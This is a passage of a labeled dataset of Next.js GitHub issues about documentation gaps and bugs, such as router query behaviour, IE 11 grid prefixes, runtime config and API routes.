light on what are these values, how are they calculated and what all modules are included while calculating these sizes. I cannot find documentation around this. "},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nStyling a CSS grid using built-in CSS support does not compile to CSS with prefixes for IE 11. \r\n\r\n## To Reproduce\r\n\r\nI created a Next.js project using `npm init next-app`, then added two pages demonstrating basic CSS grids:\r\n- [Repo](https://github.com/htunnicliff/nextjs-ie-11-broken-grid)\r\n- [Demo: CSS grid using global CSS import](https://no-ms-grid.htunnicliff.now.sh/global-css)\r\n- [Demo: CSS grid using CSS modules](https://no-ms-grid.htunnicliff.now.sh/modules)\r\n\r\n## Expected behavior\r\nCSS containing Grid Layouts should be automatically compiled for Internet Explorer 11 compatibility. (https://nextjs.org/docs/advanced-features/customizing-postcss-config#default-behavior)\r\n\r\n## Screenshots\r\n\r\nGlobal CSS demo in IE 11\r\n<img width=\"961\" alt=\"Global CSS demo in IE 11\" src=\"https://user-images.githubusercontent.com/7614039/74359088-7655c180-4d77-11ea-82fd-aae1b29312c2.png\">\r\n\r\nGlobal CSS demo in Edge\r\n<img width=\"965\" alt=\"Global CSS demo in Edge\" src=\"https://user-images.githubusercontent.com/7614039/74359213-b9b03000-4d77-11ea-9bef-41a5dcf6d7c5.png\">\r\n\r\n\r\n## System information\r\n\r\n- OS: Windows\r\n- Browser: IE 11\r\n- Version of Next.js: 9.2.1\r\n\r\n## Additional context\r\n\r\nAttempts to configure a specific browserslist key have not produced the expected output either:\r\n```json\r\n\"browserslist\": [\">0.3%\", \"ie 11\", \"not op_mini all\"]\r\n```"},{"labels":["documentation"],"text":"# Examples bug report\r\n\r\n## Example name\r\n\r\nGetting Started/Lazy Loading Modules\r\nhttps://nextjs.org/learn/excel/lazy-loading-modules/analyze-result\r\n\r\n## Describe the bug\r\n\r\nDocumentation says \"As you have seen, the firebase modules are contained inside the pages/index.js and pages/p/[id].js bundles.\"\r\nThis does not appear to be the case with NextJS 9.2.\r\nPresumably the NextJS 9.2 improved code splitting strategy has invalidated some of the description in the example.\r\n\r\n## To Reproduce\r\n\r\nFollow the steps in the Getting Started guide for the \"Lazy Loading Modules\" example.\r\n\r\n## Expected behavior\r\n\r\nThe text in the example (Getting Started - Lazy Loading Modules) should reflect new optimized code-splitting behavior.\r\n\r\n## Screenshots\r\n![2020-01-26](https://user-images.githubusercontent.com/11898246/73170472-9750cc80-4152-11ea-8831-08f7a695b8a9.png)\r\n\r\n## System information\r\n\r\n- OS: Ubuntu 18.04 LTS\r\n- Browser: firefox 72.0.2 Windows\r\n- NextJS: 9.2.1\r\n\r\n## Additional context\r\n\r\nAdd any other context about the problem here.\r\n"},{"labels":[null,"documentation"],"text":"## Describe the bug\r\n\r\nThere are no docs to be found on Logging. Also, the default configuration for production doesn't output access logs.\r\n\r\n## To Reproduce\r\n\r\nSearch official docs and observe there is nothing about logging.\r\n\r\n![Screen Shot 2019-12-29 at 1 00 47 PM](https://user-images.githubusercontent.com/487897/71561398-891c6d00-2a3b-11ea-85a7-33ed7f7788ef.png)\r\n\r\n\r\n## Expected behavior\r\n\r\nI expect to see extensive docs about logging.\r\n\r\nAlso, I expect to see access logs in my docker/kubernetes pod logs by default.\r\n\r\n## Screenshots\r\n\r\n![Screen Shot 2019-12-29 at 1 01 16 PM](https://user-images.githubusercontent.com/487897/71561425-e2849c00-2a3b-11ea-9303-626cd9a63c7f.png)\r\n\r\n\r\n## System information\r\n- Version of Next.js: 9.1.6\r\n\r\n## Additional context\r\n\r\nRelated issue #5512 \r\n"},{"labels":["documentation"],"text":"# Examples bug report\r\nThere is a bug on the **Fetching Data for Pages** section of the NextJS Learn on the official website\r\n## Example name\r\n`TypeError: Cannot read property 'medium' of null`\r\n\r\n## Describe the bug\r\nIn the sample API, the keyword used was 'batman'. Apparently all batman shows have image object return values other than null.\r\nHowever, when I changed the keyword to 'power', some of the shows did not have image object and they returned null.\r\nFor such shows where there are no images, this line (in [id].js page):\r\n`<img src={props.show.image.medium} />` breaks and throws the TypeError shown above.\r\n\r\n## To Reproduce\r\n1. Change the API link in the 'pages/index.js' to:\r\n`'https://api.tvmaze.com/search/shows?q=power'`\r\n2. On the browser, when the when the power shows have rendered, click on the second item on the list (The Power).\r\n3. See error\r\n\r\n## Expected behavior\r\nYou will be faced with an error screen like this:\r\n![error](https://user-images.githubusercontent.com/49484425/71109272-24544d80-21c5-11ea-884e-e864dc3496dc.PNG)\r\n\r\n\r\n## To Fix\r\nTaking into consideration, that some shows may be returning null values under their image property, I had to use optional chaining (an experimental feature) to take care of that. (there are other simpler logic to take care of null)\r\n\r\n**Sample show without Image:**\r\n![showWithoutImage](https://user-images.githubusercontent.com/49484425/71109548-b65c5600-21c5-11ea-93ee-f9ea0e4fb27c.PNG)\r\n\r\n**Sample show with Image:**\r\n![showWithImage](https://user-images.githubusercontent.com/49484425/71109534-afcdde80-21c5-11ea-9b85-55c6412ffb05.PNG)\r\n\r\n\r\n## System information\r\n- OS: [ Windows]\r\n- Browser (if applies) [Chromium-based]\r\n- Version of Next.js: [9.1.5]\r\n\r\n## Additional context\r\n"},{"labels":["documentation"],"text":"Looking at many SSG specific features being built into Nextjs (especially https://github.com/zeit/next.js/issues/9524) , here's what I think is the biggest issue in using Nextjs for SSG.\r\n\r\nThe problem is that Nextjs entire documentation and manuals are written from the perspective of a server-side rendering framework. They are not geared around the usecase of someone wanting to either quickly get started..or someone who is working with a Nextjs SSG and wanted help on some SSG contextual aspect. \r\n\r\nFor example, the entire section of \"Prefetching Pages\", \"Custom server and routing\", and many more is not relevant for a SSG usecase. In fact on the left side - there is no section for \"static site generation\". The documentation page of Nextjs lets people think that this is not a usecase that Nextjs supports. \r\n\r\nI dont believe there is any real way the two usecases can be merged in docs without massive cognitive overload for the user. \r\n\r\nThe documentation subsites should be entirely different for SSG and SSR usecases. Its ok if section are duplicated (which can be included in both sites from \"common docs\"). "},{"labels":["documentation",null],"text":"# Feature request\r\n\r\n## Is your feature request related to a problem? Please describe.\r\n\r\n`next export` allows me to export static HTML files. What's missing is a way to also export other dynamic content referenced by those static HTML files like images.\r\n\r\n## Describe the solution you'd like\r\n\r\nAPI routes allow me to render dynamic content like images. Next.js should support static export for API routes to make this content available for static sites.\r\n\r\n## Describe alternatives you've considered\r\n\r\nBoth alternatives I've considered don't seem practical to me:\r\n\r\n- Implement a custom export script which calls the API routes and stores the content in the exported directory.\r\n- Call the API route lamda function in exportPathMap.\r\n\r\n## Additional context\r\n\r\nMaybe there is a reason why this is not possible. In this case a short explanation in https://err.sh/zeit/next.js/api-routes-static-export would be great."},{"labels":["documentation"],"text":"# Bug report\r\n\r\nbuild error with components folder in pages folder\r\n\r\n\r\n## Describe the bug\r\n\r\nI wanted to create custom nav component with home page, so I created a nav component in pages/index/components/nav.js \r\n\r\nnav.js\r\n\r\n```js\r\nimport React from 'react'\r\n\r\nconst Nav = ({list}) => (\r\n\r\n    <div>\r\n        {list.map(item => <p>item</p>)}\r\n    </div>\r\n)\r\n\r\nexport default Nav\r\n\r\n```\r\n\r\nwhen I try to build the project `next build`, it has this following error\r\n\r\n```\r\nError occurred prerendering page \"/index/components/nav\": TypeError: Cannot read property 'map' of undefined\r\n    at Nav (/Users/jay/Downloads/my-app/.next/server/static/gvH9SPsJWVGjX-v1v6eEN/pages/index/components/nav.js:116:31)\r\n    at d (/Users/jay/Downloads/my-app/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:36:498)\r\n    at Za (/Users/jay/Downloads/my-app/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:39:16)\r\n    at a.b.render (/Users/jay/Downloads/my-app/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:476)\r\n    at a.b.read (/Users/jay/Downloads/my-app/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:44:18)\r\n    at renderToString (/Users/jay/Downloads/my-app/node_modules/react-dom/cjs/react-dom-server.node.production.min.js:54:364)\r\n    at render (/Users/jay/Downloads/my-app/node_modules/next/dist/next-server/server/render.js:81:16)\r\n    at Object.renderPage (/Users/jay/Downloads/my-app/node_modules/next/dist/next-server/server/render.js:323:20)\r\n    at /Users/jay/Downloads/my-app/.next/server/static/gvH9SPsJWVGjX-v1v6eEN/pages/_document.js:431:21\r\n    at Generator.next (<anonymous>)\r\n```\r\n\r\nWhen I moved components folder out of pages folder, it does not have this issues anymore\r\n\r\n## To Reproduce\r\n\r\n1. create index folder under pages\r\n2. create components folder under index folder\r\n3. create nav.js file under components folder\r\n```js\r\nimport React from 'react'\r\n\r\nconst Nav = ({list}) => (\r\n\r\n    <div>\r\n        {list.map(item => <p>item</p>)}\r\n    </div>\r\n)\r\n\r\nexport default Nav\r\n```\r\n4. `next build`\r\n"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nAfter deploying the tutorial project at https://nextjs.org/learn/excel/static-html-export/deploying-the-app. The resulting deployment on Now only works when clicking links. Hitting refresh on any page apart from the index will result in a 404 (as the file does not exist on the server). This appears to be because when testing locally with `serve` the html extension is stripped, but in Now this does not happen. In any case the static site should not depend on the server stripping the html extension.\r\n\r\n## To Reproduce\r\n\r\nFollow the tutorial at https://nextjs.org/learn/excel/static-html-export.\r\n\r\n- After deploying to Now go to the index page\r\n- Click the about link\r\n- Hit the refresh button\r\n\r\nA 404 is encountered\r\n\r\n## Expected behavior\r\n\r\nThe about page should reload\r\n"},{"labels":["documentation"],"text":"Hey folks 👋 \r\n\r\nI've seen a couple of cases of words like \"simple\", \"easily\" and \"just\" (and some other variations) in your docs. @carolstran explained in her blog post [How to remove condescending language from documentation](https://dev.to/meeshkan/how-to-remove-condescending-language-from-documentation-4a5p) why that can make some people feel frustrated and isolated while reading documentation with these words. \r\n\r\nIf you agree and allow me to proceed I can open a PR adapting the docs by removing these words or rephrasing the sentences where they are used.\r\n\r\nFor more reference on this topics you can also check [Jim Fisher's Don't Say Simply talk from Write the Docs Prague 2018](https://www.youtube.com/watch?v=gsT2BBWBVmM)\r\n\r\nThank you in advance and please let me know your thoughts about this 😄 "},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nUsing Next 9's routing solution for a Universal App, \"router.query\" for post-SSR client-side navigation is never populated even if `asPath` contains a query string for any of the following\r\nrouter access methods:\r\n```\r\nimport { SingletonRouter, useRouter, withRouter } from 'next/router';\r\n```\r\n\r\n## To Reproduce\r\n\r\nPerform an initial navigation to `/search?term=hello`, the server rendered page's router information contains a populated \"query\":\r\n```\r\nconst router = useRouter();\r\nconsole.log({ router }); // asPath: \"/search?term=hello\", pathname: \"/search\", query: { term: \"hello\" }\r\n```\r\n\r\nThen navigate to the same pathname, with a different query string: `/search?term=bye`. At this point Router empties \"query\", but has the correct new `asPath`:\r\n```\r\nconst router = useRouter();\r\nconsole.log({ router }); // asPath: \"/search?term=hello\", pathname: \"/search\", query: {}\r\n```\r\n\r\n## Expected behavior\r\n\r\nFor the client side navigation to a route with specified query parameters such as `/search?term=bye`, `router.query` contains the parsed query string.\r\n\r\nIf this is not expected, it would be helpful to better document this behavior and the correct approach on the client. I would prefer to always access routing information off of the available hook / HOC rather than off window on the client to avoid a split-brain solution between the client and the server.\r\n"},{"labels":["documentation"],"text":"I recently needed a feature allowing me to remove `if...else statement` from build output via a`webpack.DefinePlugin` ([DOCS](https://webpack.js.org/plugins/define-plugin/)) server vs browser condition\r\n\r\nI looked into Next.js source and happily found a `process.browser` in [webpack-config](https://github.com/zeit/next.js/blob/canary/packages/next/build/webpack-config.ts)\r\n\r\n```typescript\r\nlet webpackConfig: webpack.Configuration = {\r\n  // ...\r\n  plugins: [\r\n    // ...\r\n    new webpack.DefinePlugin({\r\n      // ...\r\n      'process.browser': JSON.stringify(!isServer)\r\n    })\r\n  ]\r\n};\r\n```\r\n\r\nI have done the tutorial and tried searching for this `process.browser`in the docs.  \r\nI found a lot of \"injectable\" `process.env[...]` related documentation, but nothing related to default build targets related variables.\r\n\r\nI tested it and it's doing exactly what I needed.\r\n\r\nDemo:  \r\n```typescript\r\nconst api: API = process.browser ? require(\"../api/proxy\").api : require(\"../api/auth\").api;\r\n```\r\n`api/proxy.ts`\r\n```typescript\r\nexport const api: API = {\r\n  find: (id: string) => fetch(`/api/resource/${id}`), // regexp \\/api\\/resource\\/\r\n  // ...\r\n};\r\n```\r\n\r\n`api/auth.ts`\r\n```typescript\r\nconst backendUrl = `${process.env.SECRET_BACKEND}/api/${process.env.SECRET_BACKEND_VERSION}`;\r\n\r\nexport const api: API = {\r\n  find: async (id: string) => {\r\n    const refs = await fetch(\r\n      // regexp \\/refs\\?access_token=\r\n      `${backendUrl}/refs?access_token=${process.env.SECRET_BACKEND_ACCESS_TOKEN}`\r\n    );\r\n    return fetch(`${backendUrl}/resource/${id}`, {\r\n      headers: {\r\n        Authorization: `Token ${process.env.SECRET_BACKEND_ACCESS_TOKEN}`,\r\n        ref: (await refs.json()).master\r\n      }\r\n    });\r\n  }\r\n  // ...\r\n};\r\n```\r\n\r\n`rm -rf .next`\r\n`npm run build`\r\n`cd next`\r\n\r\n```sh\r\ngrep \\/api\\/resource\\/ . -rl --exclude-dir=cache \r\n\r\n./static/OQ9_IPyl2LC8X7moS4k5r/pages/index.js\r\n```\r\n\r\n```sh\r\ngrep \\/refs\\?access_token= . -rl --exclude-dir=cache \r\n\r\n./serverless/pages/index.js\r\n```\r\n\r\n* is the process.browser meant to be private ?\r\n* is there a less hacky or more default way to implement this kind of build-target-toggle that I missed in the documentation ?\r\n* If no, and no, should this make its way to documentation ?"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nThe `pathname` returned from `useRouter` doesn't match the description of this data in the [readme](https://github.com/zeit/next.js#routing).\r\n\r\nI'm unsure if this is a bug, or simply incomplete information in the current docs. Regardless, this is a point of semi-regular confusion on our team.\r\n\r\n## To Reproduce\r\n\r\n1. Create the following page:\r\n```tsx\r\n[locale]/posts/[id].tsx\r\n```\r\n\r\n2. Within this page, use `useRouter`:\r\n\r\n```tsx\r\nimport { useRouter } from 'next/router'\r\n\r\nconst Page = () => {\r\n  const router = useRouter()\r\n  console.log(router)\r\n\r\n  return (<h1>Example</h1>)\r\n}\r\n\r\nexport default Page\r\n```\r\n\r\n3. Visit this page in the browser, with some query string (i.e. `/fr/posts/abc?q=123`)\r\n4. View the log (either server logs, or in the browser console):\r\n```ts\r\n{\r\n  route: \"/[locale]/posts/[id]\",\r\n  pathname: \"/[locale]/posts/[id]\",\r\n  query: {\r\n    locale: \"fr\",\r\n    id: \"abc\",\r\n    \"q\": \"123\"\r\n  },\r\n  asPath: \"/fr/posts/abc?q=123\"\r\n}\r\n```\r\n\r\n## Expected behavior\r\n\r\nBased on the following descriptions of these values:\r\n\r\n> - `route` - String of the current route\r\n> - `pathname` - String of the current path excluding the query string\r\n> - `asPath` - String of the actual path (including the query) shows in the browser\r\n> [Reference](https://github.com/zeit/next.js#routing)\r\n\r\nI would expect the following `useRouter` results:\r\n\r\n```diff\r\n{\r\n  route: \"/[locale]/posts/[id]\",\r\n- pathname: \"/[locale]/posts/[id]\",\r\n+ pathname: \"/fr/posts/abc\",\r\n  query: {\r\n    locale: \"fr\",\r\n    id: \"abc\",\r\n    \"q\": \"123\"\r\n  },\r\n  asPath: \"/fr/posts/abc?q=123\"\r\n}\r\n```\r\n\r\n## Screenshots\r\n\r\nN/A\r\n\r\n## System information\r\n\r\n- OS: macOS\r\n- Browser: N/A[e.g. chrome, safari]\r\n- Version of Next.js: `9.0.7`\r\n\r\n## Additional context\r\n\r\nNone\r\n"},{"labels":[null,null,"documentation"],"text":"# Feature request\r\n\r\n## Is your feature request related to a problem? Please describe.\r\n\r\nI see `Head.rewind()` being used in several examples (e.g. [the apollo example](https://github.com/zeit/next.js/blob/ba246446ef8069e160c3a9a010549e89e222dd1e/examples/with-apollo/lib/apollo.js)) but I don't really understand what it does and can't find documentation about it.\r\n\r\n## Describe the solution you'd like\r\n\r\nIf possible, I would like some documentation about it. What happens if I omit it? Could it be possible to have a concrete example?\r\n"},{"labels":["documentation"],"text":"Despite 'opting out' of static optimization, production build still fails owing to (one assumes) validation for that functionality.\r\n\r\nError as follows:\r\n\r\n```\r\nWarning: You have opted-out of Automatic Static Optimization due to `getInitialProps` in `pages/_app`.\r\nRead more: https://err.sh/next.js/opt-out-auto-static-optimization\r\n\r\n> Build error occurred\r\nError: automatic static optimization failed: found pages without a React Component as default export in [...list of files]\r\n```\r\n## To Reproduce\r\n\r\nAdd getInitialProps method to pages/_app class.\r\n\r\n/pages/example/index.tsx:\r\n\r\n```\r\nimport { TestOne, TestTwo } from './components';\r\n...\r\nexport default class Example extends Page {\r\nrender() {\r\n  <React.Fragment>\r\n    <TestOne />\r\n    <TestTwo />\r\n  </React.Fragment>\r\n}\r\n```\r\n/pages/example/components.tsx:\r\n\r\n```\r\nexport class TestOne extends React.Component {\r\n...\r\n}\r\n...\r\nexport class TestTwo extends React.Component {\r\n...\r\n}\r\n```\r\n\r\nAttempt production build.\r\n\r\n## Expected behavior\r\n\r\nA warning, but for the build to succeed.\r\n\r\n## System information\r\n\r\nnext@9.0.8\r\n\r\n## Additional context\r\n\r\nWe upgraded from next 8 to next 9 owing to its superior typescript offering. However, we are also using some legacy code that we have not been in a position to change to date which makes Static Optimization problematic. We are clearly not following React best practice, and also not using next routing as intended, so I realise that this is happening because we are off-message and we are working on fixing this within our own context.\r\n\r\nHowever, I still consider this a bug, as there is the implication that the pages check is being run in the background even when not necessary which will needlessly increase build time and possibly cause problems for other users trying to suppress the optimization for similar legacy reasons.\r\n"},{"labels":["documentation"],"text":"[API routes](https://github.com/zeit/next.js#api-routes) were introduced some time ago and they are a very important feature especially for the people building their API in custom servers. This new lesson will be focused in teaching their usage as APIs for Next.js pages.\r\n\r\nThe lesson will be included alongside the lessons in `basics`, and it should show the usage of multiple api routes with at least a `get` and a `post` request."},{"labels":["documentation"],"text":"As some users get confused as to why we create a tsconfig.json and force certain options. "},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\nWhen a Next.js app is configured to use Express server, the application will work in localhost, but when it is deployed to now, the Express server route fails.\r\n\r\nA clear and concise description of what the bug is.\r\n\r\n## To Reproduce\r\nConfigure the Next.js project as follows:\r\n\r\nnow.json\r\n```\r\n{\r\n    \"version\": 1,\r\n    \"name\": \"App\",\r\n    \"builds\": [\r\n        {\r\n            \"src\": \"package.json\",\r\n            \"use\": \"@now/next\"\r\n        }\r\n    ]\r\n}\r\n```\r\n\r\nIn the package.json it contains the following script\r\n\r\n```\r\n{\r\n  \"dependencies\": {\r\n    \"@zeit/next-css\": \"^1.0.1\",\r\n    \"@zeit/next-sass\": \"^1.0.1\",\r\n    \"bootstrap\": \"^4.3.1\",\r\n    \"express\": \"^4.17.1\",\r\n    \"js-cookie\": \"^2.2.0\",\r\n    \"jwt-decode\": \"^2.2.0\",\r\n    \"next\": \"^9.0.3\",\r\n    \"node-sass\": \"^4.12.0\",\r\n    \"now\": \"^16.1.1\",\r\n    \"react\": \"^16.8.6\",\r\n    \"react-bootstrap\": \"^1.0.0-beta.11\",\r\n    \"react-dom\": \"^16.8.6\",\r\n    \"recompose\": \"^0.30.0\"\r\n\r\n...\r\n  },\r\n  \"scripts\": {\r\n    \"dev\": \"node server.js\",\r\n    \"build\": \"next build\",\r\n    \"now-build\": \"next build\",\r\n    \"start\": \"NODE_ENV=production node server.js\"\r\n  }\r\n}\r\n```\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\nAny Next.js project build with this configuration will work in localhost, but when deployed to now, the Express server routes will stop working.\r\n\r\n## Expected behavior\r\n\r\nExpected a Next.js deployed to Zeit Now can use the Express server as SSR.\r\nZeit document link [https://zeit.co/guides/custom-next-js-server-to-routes/?query=express#the-old-custom-server-method](https://zeit.co/guides/custom-next-js-server-to-routes/?query=express#the-old-custom-server-method)\r\n\r\n## Screenshots\r\n\r\nIf applicable, add screenshots to help explain your problem.\r\n\r\n## System information\r\n\r\n- OS: [e.g. macOS, Windows] - Tested in Windows 10 and 10/Pro\r\n- Browser (if applies) [e.g. chrome, safari] - IE, Edge, Chrome\r\n- Version of Next.js: [e.g. 6.0.2] - 9.0.3\r\n\r\n## Additional context\r\n\r\nAdd any other context about the problem here.\r\n"},{"labels":["documentation"],"text":"> \"Your `<Link>`'s `as` value is incompatible with the `href` value. This is invalid.\"\r\n\r\nRef: https://spectrum.chat/next-js/general/linking-static-page-routes~a3f0b5f2-397e-4a98-bb95-f98bdf5ddd65\r\n\r\nThis needs a err.sh link explaining how to solve it."},{"labels":["documentation"],"text":"`static` and `api` directories are special too.\r\n\r\nat https://nextjs.org/learn/basics/using-shared-components/the-component-directory\r\n\r\n![image](https://user-images.githubusercontent.com/2733862/62372331-e15c4b00-b53f-11e9-8b13-b14db876d2ef.png)\r\n\r\n\r\n"},{"labels":["documentation"],"text":"We should explain the need for this file.\n\nCloses [a Spectrum thread](https://spectrum.chat/next-js/general/what-is-the-purpose-of-next-env-d-ts~ac4c7ca0-aacb-4bfe-ad23-81315fa040af)."},{"labels":["documentation"],"text":"# Examples bug report\r\n\r\n## Example name\r\n\r\nE1-static-export\r\n\r\n## Describe the bug\r\n\r\nI was following the static export tutorial. On the step to generate the individual post pages, after modifying the next.config.js, when running `npm run export` the generated static .html files all have empty `h1` elements. When loading the index page and using client-based navigation, the titles appear, but only the post body is shown on reload of the post page.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\n1. `git clone https://github.com/zeit/next-learn-demo.git`\r\n2. `npm install`\r\n3. Follow the Export into a Static HTML App [completing the Exporting Other Pages step](https://nextjs.org/learn/excel/static-html-export/exporting-other-pages)\r\n4. `npm run build`\r\n5. `npm run export`\r\n6. `cd out`\r\n7. `serve -p 8080`\r\n\r\n## Expected behavior\r\n\r\nThe titles specified in the next.config.js should have been baked into the static .html files.\r\n\r\n## System information\r\n\r\n- OS: Windows 7\r\n- Version of Next.js: 9.0.2\r\n"},{"labels":["documentation"],"text":"Users have trouble understand how to handle HTTP methods, even though this is normal Node.js HTTP request handling we should document it for ergonomics.\r\n\r\nRef:\r\nhttps://spectrum.chat/next-js/general/restrict-methods-with-next-api-routes~534c1e77-3f93-4bf5-a2ec-74cc3f2d2a6a\r\nhttps://spectrum.chat/next-js/general/post-api-routes~abf984ab-3d6a-46b3-9173-7f1a074f6e0f"},{"labels":["documentation",null],"text":"# Examples bug report\r\n\r\n## Example name\r\n\r\nTypeScript\r\n\r\n## Describe the bug\r\n\r\nDuring the TypeScript example, the instructions are suppose to produce a compile error in the server console because of inaccurate configuration. Then later in the exercise, correct the configuration for the userAgent to successfully display in the browser window. However, using Firefox and Chrome, my userAgent displays correctly the entire time.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior, please provide code snippets or a repository:\r\n\r\n1. Follow the example instructions here:\r\nhttps://nextjs.org/learn/excel/typescript\r\n\r\n## Expected behavior\r\n\r\nA clear and concise description of what you expected to happen.\r\n\r\n## System information\r\n\r\n- OS: Windows 10\r\n- Browser: FireFox Developer Edition 69.0b4 (64-bit)\r\n- Version of Next.js: 9.0.2"},{"labels":[null,"documentation"],"text":"See https://github.com/zeit/next.js/pull/7961#issuecomment-514083852"},{"labels":[null,"documentation"],"text":"# Bug report\r\n\r\nIt was time-consuming and little frustrating to figure out minor adjustments to get Next 9's new routing to play nice with now and now-cli locally.  \r\n\r\n## To Reproduce\r\n\r\nUpdate a production app deployed on now 2 to v9+ and then attempt to use the new dynamic routing.\r\n\r\n## Expected behaviour\r\n\r\nGiven that Now and Next are both published by Zeit, tighter documentation updates, or references with regards to upgrading.\r\n\r\n## Additional context\r\n\r\nWhile I eventually managed, by going through the updated docs, the blog post, the upgrade  / migrate notes, and then the updated examples folder, which was the key.\r\n\r\n1. for others looking for an answer, using @now/next@canary as per the example, and removing your custom routes object, now automatically handles dynamic routes defined in the new way introduced in Next 9.  (ie:  `post/[id]/index.js` `post/[id]/comment.js`)\r\n\r\n2. This isn't just a moan, but a suggestion to sett a policy for updating docs, examples and deployment specifics together with the release.  \r\n\r\nTotally Love NEXT and after a tumultuous 6 months with the upgrade to now 2,  having just got NEXT 9 setup and working, I'm feeling the same zen and hopefulness about js that I felt when I first found NEXT.\r\n"},{"labels":["documentation"],"text":"This is more of an issue with the documentation than the component itself, but the `<Link>` component is very easy to accidentally abuse to create inaccessible markup, as I’ve recently experienced while working with other developers on Next projects.\r\n\r\nIn the [Using a component that supports onClick](https://github.com/zeit/next.js#using-a-component-that-supports-onclick) section, the documentation describes how the `<Link>` component can be used on any element that supports `onClick`, without also pointing out that doing so without appropriate ARIA attributes, styling, and keyboard handlers makes the element inaccessible to assistive technology and keyboard users. There’s a note about `passHref` and SEO, but as currently written it implies that adding `href` to a `<div>` would be a sufficient solution, which isn’t true.\r\n\r\nThe best practice is to use the `<a>` element for **all** links, but sometimes it’s necessary for a specific project to build a custom link with `role=\"link\"` and custom JavaScript, so I understand the utility of ensuring `<Link>` works on non-`<a>`'s. But it should at least attempt to throw a warning when a developer misuses it. For example, if they wrap it around a `<button>` or a `<div>` with no `role`. Even if there are no changes to the Next codebase itself, the documentation should make this pitfall clear to developers."},{"labels":["documentation"],"text":"Reported here: https://twitter.com/sudhirmith/status/1149706325854576640\r\n\r\nhttps://nextjs.org/docs#amp-behavior-with-next-export\r\n\r\nThis section needs to be updated to mention it outputs without the subdirectory as per the new behavior: https://github.com/zeit/next.js/blob/canary/UPGRADING.md#next-export-no-longer-exports-pages-as-indexhtml"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nWhen I set the value of a `publicRuntimeConfig` property from an environment variable, it is `undefined` when buiding and starting a production bundle. It worked fine with Next.js v8.\r\n\r\n## To Reproduce\r\n\r\n**package.json**\r\n\r\n```\r\n  \"scripts\": {\r\n    \"build\": \"next build\",\r\n    \"dev\": \"TEST_ENV='a value' next\",\r\n    \"start\": \"TEST_ENV='a value' next start\"\r\n  },\r\n  \"dependencies\": {\r\n    \"next\": \"^9.0.0\",\r\n    \"react\": \"^16.8.6\",\r\n    \"react-dom\": \"^16.8.6\"\r\n  },\r\n  \"devDependencies\": {\r\n    \"@babel/core\": \"^7.5.0\"\r\n  }\r\n```\r\n\r\n**.babelrc**\r\n\r\n```\r\n{\r\n    \"presets\": [\r\n        \"next/babel\"\r\n    ]\r\n}\r\n```\r\n\r\n**next.config.js**\r\n\r\n```\r\nmodule.exports = {\r\n  publicRuntimeConfig: {\r\n    TEST_ENV: process.env.TEST_ENV\r\n  }\r\n}\r\n```\r\n\r\n**pages/index.js**\r\n\r\n```\r\nimport getConfig from \"next/config\";\r\n\r\nconst TEST_ENV = getConfig().publicRuntimeConfig.TEST_ENV;\r\n\r\nexport default () => <div>{`TEST_ENV=${TEST_ENV}`}</div>;\r\n```\r\n\r\nThen run:\r\n\r\n```\r\nyarn build && yarn start\r\n```\r\n\r\n## Expected behavior\r\n\r\nWhen running a `yarn build && yarn start`, the `TEST_ENV` value should appear in the index page as it does when downgrading to the version `8.1.0` or when running `yarn dev`.\r\n\r\n"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nDifferent origin request don't resolve. Error seems to be swallowed.\r\n\r\nSame origin requests to `/api/subscribe` work fine. Different origin requests to `/api/subscribe` return a generic 400 error no matter what I try and log or respond with.\r\n\r\n## To Reproduce\r\n\r\n1. `git clone https://github.com/state-matters/web.git`\r\n2. Check out the `develop` branch\r\n3. `npm install`\r\n4. `npm run start:dev`\r\n5. Go to localhost:3000/subscribe and complete to form\r\n6. Open insomnia and POST to localhost:3000/api/subscribe with the following json\r\n```\r\n{\r\n  \"email\": \"email@email.com\",\r\n  \"first\": \"first\",\r\n  \"last\": \"last\"\r\n}\r\n```\r\n\r\n## Expected behavior\r\n\r\nI would expect to be able to post to `/api/subscribe` from both the same origin and not. It's strange that I'm not able to post outside.\r\n\r\n## System information\r\n\r\n- Version of Next.js: 9.0.0\r\n"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nThe README contains this line:\r\n\r\n> To serve static files from the root directory you can add a folder called public and reference those files from the root, e.g: /robots.txt.\r\n\r\nHowever #7771 made this feature experimental. It should either be removed from the readme or the experimental flag to enable it should be mentioned.\r\n\r\n## To Reproduce\r\n\r\nRead README (https://github.com/zeit/next.js)\r\n\r\n## Expected behavior\r\n\r\nShould not include experimental features or should mention that the feature is experimental.\r\n\r\n## Screenshots\r\n\r\nN/A\r\n\r\n## System information\r\n\r\nN/A\r\n\r\n## Additional context\r\n\r\nN/A\r\n"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\nIn the docs it says that \r\n![docs](https://user-images.githubusercontent.com/14829154/60832448-8fd0d280-a1c4-11e9-9303-8a9882b4f1c7.png)\r\n\r\nbut when I tried to use that types for req and res I got this:\r\n![2019-07-08_21-05](https://user-images.githubusercontent.com/14829154/60832474-a0814880-a1c4-11e9-8ee7-b44b6787dd77.png)\r\n\r\n## System information\r\n\r\n- OS: [Linux]\r\n- Browser (if applies) [chrome]\r\n- Version of Next.js: [e.g. 9.0.0]\r\n\r\nOr do I do something incorrectly?\r\n"},{"labels":["documentation"],"text":"# Bug report\r\n\r\n## Describe the bug\r\n\r\nAfter having upgraded to v9 this morning we noticed that CSP was failing. Upon further investigation, it turned out that `ctx.req` and `ctx.res` were returning `undefined` in `_document.js` (or .ts) when calling `getInitialProps`.\r\n\r\nThis has been reproduced by combining the basic custom-document example as well as the custom-server example.\r\n\r\n## To 